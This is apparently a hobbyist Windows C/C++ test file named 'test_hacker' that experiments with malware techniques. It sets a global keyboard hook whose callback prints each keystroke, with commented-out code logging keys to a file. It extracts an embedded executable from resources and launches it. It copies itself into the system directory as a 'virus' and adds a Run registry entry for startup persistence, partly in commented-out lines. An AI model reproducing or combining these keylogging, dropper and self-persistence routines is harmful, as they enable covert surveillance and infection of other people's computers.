
//#define _AFXDLL

#ifdef _AFXDLL
#include "afx.h"
#include "afxwin.h"
#else
#include<stdio.h>
#include <windows.h>
#endif

#include "resource.h"

#include "xTest.h"
#include "x_InterfaceEx.h"

namespace space_test_hook {

	//键盘钩子测试

// 	int s_nDown = 0;
// 	HHOOK s_hHook = NULL;           //定义钩子句柄
// 	HINSTANCE s_hInstance = NULL;     //程序实例
// 
// 	LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam)
// 	{
// 		printf("\n HookProc");
// 		LRESULT Result = CallNextHookEx(s_hHook, nCode, wParam, lParam);
// 		if(wParam == 'M' && (lParam & 0x40000000))
// 		{
// 			printf("\n M is downed ! %d", s_nDown++);
// 		}
// 		return Result;
// 	}
// 
// 	//加载钩子
// 	BOOL Load()
// 	{
// 		s_hInstance = GetModuleHandle(0);
// 		//s_hHook =  SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)HookProc, s_hInstance, 0);
// 		s_hHook =  SetWindowsHookEx(WH_KEYBOARD, (HOOKPROC)HookProc, s_hInstance,  GetCurrentThreadId());
// 		if( !s_hHook )
// 		{
// 			printf("\n set hook fail");
// 			return FALSE;
// 		}
// 		printf("\n set hook suc");
// 		return TRUE;
// 	}
// 
// 	//卸载钩子
// 	BOOL UnLoad()
// 	{
// 		return UnhookWindowsHookEx(s_hHook);
// 	}
// 
// 	void test1()
// 	{
// 		BOOL bRet;
// 		bRet = Load();
// 		//nRet = UnLoad();
// 
// 		MSG msg;  
// 		while(::GetMessage(&msg, NULL, 0, 0) > 0)  
// 		{  
// 			TranslateMessage(&msg);  
// 			DispatchMessage(&msg);  
// 		}  
// 	}


	int KeyboardRecord(long code,long scancode,long flags)
	{
		printf("%c", (char)code);
// 		FILE* fp=NULL;
// 		if((fp=fopen("c:\\1.txt","a"))==NULL)
// 		{
// 			exit(1);
// 		}
// 		static int i = 0;
// 		if(i%2==0)
// 		{
// 			fprintf(fp,"%c",(char)code);
// 		}
// 		i++;
// 		fclose(fp);
		return 0;

	}

	void test2()
	{
		if( FALSE == setKeyBoardHook())
		{
			printf("\n set hook fail");
			return;
		}

		setHookFuncKeyBoard(KeyboardRecord);
		
		printf("\n");
		
		MSG msg;
		while ( GetMessage(&msg, NULL, 0, 0) )
		{
			if ( !TranslateAccelerator(msg.hwnd, NULL, &msg) )
			{
				TranslateMessage(&msg);
				DispatchMessage(&msg);
			}
		}
		clearAllHook();
	}

	//进程启动测试

	void test3()
	{
		LPTSTR lpCommandLine="D:\\Downloads\\setup.exe";

		STARTUPINFO si;
		memset(&si,0,sizeof(si));
		si.cb=sizeof(si);
		PROCESS_INFORMATION pi;

		int nRet =CreateProcess(NULL, lpCommandLine,   NULL,   NULL,  FALSE, NORMAL_PRIORITY_CLASS,   NULL,   NULL,   &si,   &pi);

		printf("\n");
	}

#ifdef _AFXDLL

	// 资源中包含exe测试

	class CHandleRes
	{
	public:
		CHandleRes() {}
		~CHandleRes() {}

		DWORD	GetResourceData(HINSTANCE hInstance, PTCHAR pszResID, PTCHAR pszResType, PBYTE& pResData)
		{
			DWORD dwResSize;
			DWORD dwErr = 0;
// 			if(!hInstance)
// 			{
// 				return -1;
// 			}

			HRSRC	hRsrc	= FindResource(hInstance, pszResID, pszResType);
			if(!hRsrc)
			{
				dwErr = GetLastError();
				return -2;
			}

			dwResSize	= SizeofResource(hInstance, hRsrc);
			pResData	= PBYTE(LoadResource(hInstance, hRsrc));
			if(!pResData)
			{
				return -3;
			}

			FreeResource(hRsrc);

			return dwResSize;
		}

		DWORD	GetResourceData(HINSTANCE hInstance, UINT uResID, PTCHAR pszResType, PBYTE& pResData)
		{
			return	GetResourceData(hInstance, MAKEINTRESOURCE(uResID), pszResType, pResData);
		}

		BOOL	ReleaseToFile(HINSTANCE hInstance, PTCHAR pszResID, PTCHAR pszResType, PTCHAR pszFileName)
		{
			PBYTE	pData	= NULL;
			DWORD	dwSize	= GetResourceData(hInstance, pszResID, pszResType, pData);
			if( dwSize < 0 )
				return	FALSE;

			CFile	fileRes;

			if(!fileRes.Open(pszFileName, CFile::modeCreate|CFile::modeWrite))
			{
				return	FALSE;
			}
			fileRes.Write(pData, dwSize);
			fileRes.Close();

			return	TRUE;
		}

		BOOL	ReleaseToFile(HINSTANCE hInstance, UINT uResID, PTCHAR pszResType, PTCHAR pszFileName)
		{
			return	ReleaseToFile(hInstance, MAKEINTRESOURCE(uResID), pszResType, pszFileName);
		}

	};

	void test4()
	{
		
// 		if( !AfxWinInit(::GetModuleHandle(NULL), NULL, ::GetCommandLine(),0) )
// 		{
// 			return ;
// 		}

		CHandleRes*	pResProcesser = new CHandleRes;

		//AFX_MANAGE_STATE(AfxGetStaticModuleState());
		//HINSTANCE hInst = GetModuleHandle(NULL);
		//HINSTANCE hInst = AfxGetResourceHandle();
		pResProcesser->ReleaseToFile(NULL, IDR_TXT1, _T("txt"), _T("test_res.txt"));

		delete pResProcesser;

		printf("");
	}

	void test5()
	{
		CHandleRes*	pResProcesser = new CHandleRes;
		pResProcesser->ReleaseToFile(NULL, IDR_EXE1, _T("exe"), _T("test_res.exe"));
		delete pResProcesser;

		//LPTSTR lpCommandLine="E:\\QC-nd\\svn\\MyLab\\trunk\\MyLab\\pro\\xTest\\test_res.exe";
		LPTSTR lpCommandLine="test_res.exe";

		STARTUPINFO si;
		memset(&si,0,sizeof(si));
		si.cb=sizeof(si);
		PROCESS_INFORMATION pi;

		int nRet =CreateProcess(NULL, lpCommandLine,   NULL,   NULL,  FALSE, NORMAL_PRIORITY_CLASS,   NULL,   NULL,   &si,   &pi);

		printf("");
	}

#endif

	// 注册表测试

	void test6()
	{
		HKEY hKey = NULL;
		DWORD dwType;
		DWORD dwSize;

		LSTATUS lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, ("HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0"), 0, KEY_READ, &hKey);


		DWORD dwCpuSpeed = 0;
		dwType = REG_DWORD;
		dwSize = sizeof(dwType);
		lRet = RegQueryValueEx(hKey, ("~MHz"), NULL, &dwType, (BYTE*)&dwCpuSpeed, &dwSize);

		BYTE sProcessorName[128];
		dwType = REG_SZ;
		dwSize = sizeof(sProcessorName);
		lRet = RegQueryValueEx(hKey, ("ProcessorNameString"), NULL, &dwType, sProcessorName, &dwSize);

		lRet = RegCloseKey(hKey);

		printf("");
	}

	void test7()
	{
		HKEY hKey = NULL;
		
		LSTATUS lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, ("HARDWARE\\DESCRIPTION\\System\\CentralProcessor"), 0, KEY_READ, &hKey);

		CHAR sKeyName[128];
		DWORD dwNameSize;
		DWORD dwIndex = 0;

		do 
		{
			sKeyName[0] = '\0';
			dwNameSize = 128;
			lRet = RegEnumKeyEx(hKey, dwIndex, sKeyName, &dwNameSize, 0, NULL, NULL, NULL);
			if ( 0 != lRet )
			{
				break;
			}

			printf("\n dwIndex = %d, sKeyName = %s", dwIndex, sKeyName);
			dwIndex++;

		} while (true);

		lRet = RegCloseKey(hKey);

		printf("\n total = %d", dwIndex);
	}

	void test8()
	{
		HKEY hKey = NULL;
		HKEY hSubKey1 = NULL;
		HKEY hSubKey2 = NULL;

		LSTATUS lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, ("HARDWARE"), 0, KEY_READ, &hKey);
		lRet = RegOpenKeyEx(hKey, ("DESCRIPTION\\System\\CentralProcessor"), 0, KEY_WRITE, &hSubKey1);
		lRet = RegOpenKeyEx(hSubKey1, ("0"), 0, KEY_READ, &hSubKey2);

		DWORD dwType;
		DWORD dwSize;

		DWORD dwCpuSpeed = 0;
		dwType = REG_DWORD;
		dwSize = sizeof(dwType);
		lRet = RegQueryValueEx(hSubKey2, ("~MHz"), NULL, &dwType, (BYTE*)&dwCpuSpeed, &dwSize);
		
		BYTE sProcessorName[128];
		dwType = REG_SZ;
		dwSize = sizeof(sProcessorName);
		lRet = RegQueryValueEx(hSubKey2, ("ProcessorNameString"), NULL, &dwType, sProcessorName, &dwSize);

		RegCloseKey(hSubKey2);
		RegCloseKey(hSubKey1);
		RegCloseKey(hKey);

		printf("");
	}

	// exe自复制，自启动测试

	void test9()
	{
		char system[MAX_PATH];
		char pathtofile[MAX_PATH];
		HMODULE GetModH = GetModuleHandle(NULL);
		//得到当前执行文件的全路径
		GetModuleFileName(GetModH, pathtofile, sizeof(pathtofile));
		//得到系统文件所在目录的路径，如c:\windows\system32
		GetSystemDirectory(system, sizeof(system));
		//形成要复制到的全路径，如c:\windows\system32\yourvirus.exe
		strcat(system,"\\AAAAA.exe");


		//自我复制到目标路径
		//LPTSTR lpCommandLine = "C:\\AAAAA.exe";
		LPTSTR lpCommandLine = system;
		BOOL bRet = CopyFile(pathtofile, system, false);

		//QA 复制到系统文件夹找不到对应文件，  但是用代码打开运行 或谷歌浏览器打开上层目录可以找到？ 会被复制到"C:\Windows\SysWOW64"文件夹下

		int nRet;

		if(bRet)
		{
			STARTUPINFO si;
			memset(&si,0,sizeof(si));
			si.cb=sizeof(si);
			PROCESS_INFORMATION pi;

			if(false)
			{
				nRet =CreateProcess(NULL, lpCommandLine,   NULL,   NULL,  FALSE, NORMAL_PRIORITY_CLASS|CREATE_NEW_CONSOLE,   NULL,   NULL,   &si,   &pi);
			}
			else
			{
				//写入注册表，以便开机自动运行
				HKEY hKey;
				LSTATUS lSta;

// 				lSta = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey );
// 				lSta = RegSetValueEx(hKey, "Writing to the Registry Example", 0, REG_SZ, (const unsigned char*)system, sizeof(system));

				BYTE sProcessorName[MAX_PATH];
				DWORD dwType = REG_SZ;
				DWORD dwSize = sizeof(sProcessorName);
				lSta = RegOpenKeyEx(HKEY_LOCAL_MACHINE, ("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_READ, &hKey);
				lSta = RegQueryValueEx(hKey, ("Writing to the Registry Example"), NULL, &dwType, sProcessorName, &dwSize);

				lSta = RegCloseKey(hKey);
				printf("");

				//QA: 写入注册表成功， 也能开机启动，但是注册表上找不到对应值 ? 6位系统路径变为 "HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run"
			}

			
			printf("");
		}

		



		printf("");
	}

	// 文件捆绑测试

	void test10()
	{

	}

}

void test_hacker()
{
	//space_test_hook::test1();
	//space_test_hook::test2();
	//space_test_hook::test3();
	//space_test_hook::test4();
	//space_test_hook::test5();
	//space_test_hook::test6();
	//space_test_hook::test7();
	//space_test_hook::test8();
	//space_test_hook::test9();
	space_test_hook::test10();

	getchar();
}